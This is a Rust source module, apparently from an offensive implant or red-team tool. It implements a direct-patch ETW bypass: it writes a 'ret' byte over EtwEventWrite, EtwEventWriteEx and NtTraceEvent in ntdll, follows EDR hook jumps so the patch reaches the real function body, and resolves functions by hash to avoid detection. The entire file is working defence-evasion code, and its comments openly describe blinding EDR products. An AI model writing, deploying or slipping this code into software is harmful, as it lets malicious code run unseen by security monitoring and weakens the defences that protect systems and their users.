//! Direct-patch ETW bypass: overwrites the first byte of `EtwEventWrite`,
//! `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll with a `ret` (0xC3)
//! instruction, causing all ETW event reporting to return immediately.
//!
//! # Motivation
//! The HWBP-based bypass in `evasion.rs` consumes debug registers (Dr0–Dr3)
//! and can be detected by EDRs that inspect register state.  This module
//! provides a complementary approach that:
//!
//! - Does not use debug registers (no Dr0–Dr3 exhaustion).
//! - Has no runtime overhead (no exception handling path).
//! - Cannot be detected by checking debug register state.
//! - Patches three distinct ETW entry points for defense-in-depth.
//!
//! # Interaction with EDR hooks
//! If an EDR has placed a 32-bit relative `jmp` (0xE9) at the function entry,
//! the implementation follows the jump to locate the real function body and
//! patches that instead, so the bypass takes effect even when a hook is present.
//!
//! # Safety
//! All exported functions are `unsafe`.  They perform raw memory writes to
//! executable pages and must only be called on Windows x86-64.  On all other
//! platforms the functions are no-ops.
//!
//! No OS handles are opened: ntdll is located by walking the PEB loader list
//! and `VirtualProtect` operates on the current process address space directly.

#[cfg(windows)]
use std::sync::atomic::AtomicU8;

/// Saved original first byte of `EtwEventWrite` (0 = never patched).
#[cfg(windows)]
static ORIG_ETW_WRITE: AtomicU8 = AtomicU8::new(0);
/// Saved original first byte of `EtwEventWriteEx` (0 = never patched).
#[cfg(windows)]
static ORIG_ETW_WRITE_EX: AtomicU8 = AtomicU8::new(0);
/// Saved original first byte of `NtTraceEvent` (0 = never patched).
#[cfg(windows)]
static ORIG_NT_TRACE: AtomicU8 = AtomicU8::new(0);

// ── Windows implementation ────────────────────────────────────────────────────

#[cfg(windows)]
mod imp {
    use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
    use std::sync::atomic::Ordering;
    use winapi::um::memoryapi::VirtualProtect;
    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

    /// Maximum number of hook chain levels to follow before giving up.
    const MAX_HOOK_CHAIN_DEPTH: usize = 4;

    /// Resolve the real patchable address for a function, following any
    /// 32-bit relative `jmp` (0xE9) or RIP-relative indirect `jmp`
    /// (0xFF 0x25) that an EDR may have placed at the entry.  Chains of
    /// up to [`MAX_HOOK_CHAIN_DEPTH`] levels are followed; deeper chains
    /// (or circular references from a malicious hook table) are rejected
    /// and the last valid address is returned.
    unsafe fn resolve_target(func_addr: usize) -> usize {
        if func_addr == 0 {
            return 0;
        }
        let mut addr = func_addr;
        for _ in 0..MAX_HOOK_CHAIN_DEPTH {
            let first = *(addr as *const u8);
            if first == 0xE9 {
                // Near relative jmp: destination = addr + 5 + rel32
                let rel = *(addr.wrapping_add(1) as *const i32) as isize;
                let dest = (addr as isize).wrapping_add(5).wrapping_add(rel) as usize;
                if dest == 0 {
                    break;
                }
                addr = dest;
            } else if first == 0xFF && *(addr.wrapping_add(1) as *const u8) == 0x25 {
                // RIP-relative indirect jmp: slot = addr + 6 + disp32
                // absolute target = *slot (8-byte pointer)
                let disp = *(addr.wrapping_add(2) as *const i32) as isize;
                let slot = (addr as isize).wrapping_add(6).wrapping_add(disp) as usize;
                if slot == 0 {
                    break;
                }
                let dest = *(slot as *const usize);
                if dest == 0 {
                    break;
                }
                addr = dest;
            } else {
                // No further hook — addr is the real function body.
                break;
            }
        }
        addr
    }

    /// Attempt to patch a single function entry point with `ret` (0xC3).
    ///
    /// Returns `true` if the patch was applied or the function was already
    /// patched; `false` if any step failed (e.g. `VirtualProtect` rejected
    /// by CFG).
    pub unsafe fn patch_one(func_addr: usize, orig: &std::sync::atomic::AtomicU8) -> bool {
        let target = resolve_target(func_addr);
        if target == 0 {
            return false;
        }

        let first_byte = *(target as *const u8);

        // Already patched by us or something else — record and skip.
        if first_byte == 0xC3 {
            orig.store(0xC3, Ordering::Relaxed);
            return true;
        }

        // Save the original byte before overwriting.
        orig.store(first_byte, Ordering::Relaxed);

        let mut old_protect: u32 = 0;
        if VirtualProtect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return false;
        }

        // Atomically visible write of the ret instruction.
        core::ptr::write_volatile(target as *mut u8, 0xC3u8);

        // Restore original protection.  Failure here is non-fatal: the patch
        // is already in place.
        let mut dummy: u32 = 0;
        VirtualProtect(target as *mut _, 1, old_protect, &mut dummy);

        true
    }

    /// Restore a single patched function to its original first byte.
    pub unsafe fn unpatch_one(func_addr: usize, orig: &std::sync::atomic::AtomicU8) -> bool {
        let target = resolve_target(func_addr);
        if target == 0 {
            return false;
        }

        let original = orig.load(Ordering::Relaxed);
        // 0 means we never patched this function (all real ntdll exports start
        // with a non-zero opcode such as 0x4C for `mov r10, rcx`).
        if original == 0 {
            return false;
        }

        let mut old_protect: u32 = 0;
        if VirtualProtect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
            return false;
        }

        core::ptr::write_volatile(target as *mut u8, original);

        let mut dummy: u32 = 0;
        VirtualProtect(target as *mut _, 1, old_protect, &mut dummy);

        true
    }

    /// Apply the direct-patch ETW bypass.
    ///
    /// Returns `true` if at least one function was successfully patched.
    pub unsafe fn patch_etw() -> bool {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return false,
        };

        let mut patched_any = false;

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE)
        {
            if patch_one(addr, &ORIG_ETW_WRITE) {
                patched_any = true;
            }
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITEEX)
        {
            if patch_one(addr, &ORIG_ETW_WRITE_EX) {
                patched_any = true;
            }
        }

        // NtTraceEvent is the kernel-mode ETW sink.  Patching it provides
        // defense-in-depth: even if userland functions are re-hooked by an EDR
        // after our initial patch, the kernel path remains silenced.
        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTTRACEEVENT)
        {
            if patch_one(addr, &ORIG_NT_TRACE) {
                patched_any = true;
            }
        }

        patched_any
    }

    /// Restore all patched ETW functions to their original first bytes.
    pub unsafe fn unpatch_etw() {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return,
        };

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE)
        {
            unpatch_one(addr, &ORIG_ETW_WRITE);
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITEEX)
        {
            unpatch_one(addr, &ORIG_ETW_WRITE_EX);
        }

        if let Some(addr) =
            pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTTRACEEVENT)
        {
            unpatch_one(addr, &ORIG_NT_TRACE);
        }
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Patch `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` in ntdll.dll
/// by overwriting their first byte with `ret` (0xC3), suppressing ETW telemetry.
///
/// This is a complement to the HWBP bypass in `evasion::setup_hardware_breakpoints`:
/// it consumes no debug register slots and has zero exception-handler overhead.
///
/// On non-Windows targets this is a no-op.
///
/// # Safety
///
/// Modifies executable code in the running process.  Must only be called once,
/// on Windows x86-64, before ETW-instrumented code executes.
#[cfg(windows)]
pub unsafe fn patch_etw() {
    let _ = imp::patch_etw();
}

#[cfg(not(windows))]
pub unsafe fn patch_etw() {}

/// Restore `EtwEventWrite`, `EtwEventWriteEx`, and `NtTraceEvent` to their
/// original first bytes, undoing the direct-patch bypass.
///
/// Must only be called after [`patch_etw`] has been invoked.
/// On non-Windows targets this is a no-op.
///
/// # Safety
///
/// Same requirements as [`patch_etw`].
#[cfg(windows)]
pub unsafe fn unpatch_etw() {
    imp::unpatch_etw();
}

#[cfg(not(windows))]
pub unsafe fn unpatch_etw() {}
